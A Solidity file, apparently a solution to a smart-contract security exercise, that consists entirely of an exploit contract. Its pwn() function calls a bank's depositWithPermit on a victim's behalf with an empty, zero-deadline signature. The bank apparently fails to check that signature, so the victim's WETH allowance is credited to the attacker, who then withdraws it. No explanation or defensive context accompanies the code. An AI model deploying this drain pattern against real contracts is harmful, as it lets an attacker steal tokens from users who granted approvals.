// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
}

interface IERC20Bank {
    function token() external view returns (address);

    function deposit(uint amount) external;

    function depositWithPermit(
        address owner,
        address spender,
        uint amount,
        uint deadline,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external;

    function withdraw(uint amount) external;
}

contract ERC20BankExploit {
    address private immutable target;

    constructor(address _target) {
        target = _target;
    }

    function pwn(address alice) external {
        address weth = IERC20Bank(target).token();
        uint bal = IERC20(weth).balanceOf(alice);
        IERC20Bank(target).depositWithPermit(
            alice,
            address(this),
            bal,
            0,
            0,
            "",
            ""
        );
        IERC20Bank(target).withdraw(bal);
    }
}
